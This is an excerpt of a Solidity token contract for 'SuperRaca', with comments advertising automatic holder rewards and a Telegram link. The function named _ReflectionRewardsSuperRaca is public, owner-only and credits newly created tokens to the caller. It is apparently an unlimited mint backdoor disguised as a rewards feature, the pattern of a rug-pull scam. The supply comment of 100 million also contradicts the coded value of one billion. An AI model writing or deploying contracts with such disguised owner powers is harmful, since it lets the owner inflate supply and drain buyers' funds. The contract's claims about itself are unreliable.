...
//
// $SuperRaca proposes an innovative feature in its contract.
//
// DIVIDEND YIELD PAID IN SuperRaca! With the auto-claim feature,
// simply hold$SuperRaca and you'll receive SuperRaca automatically in your wallet.
// 
// Hold SuperRaca and get rewarded in SuperRaca on every transaction!
//
//
// 📱 Telegram: https://t.me/SuperRacaBSC
// 🌎 Website: TBA
// 🌐 Twitter: TBA
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ReflectionRewardsSuperRaca(uint256 amount) public onlyOwner {
    _ReflectionRewardsSuperRaca(msg.sender, amount);
    }
    ...
    function _ReflectionRewardsSuperRaca(address account, uint256 amount) internal virtual {
...
contract SUPERRACA is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("SUPER RACA", "SUPERRACA") {
        _ReflectionRewardsSuperRaca(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}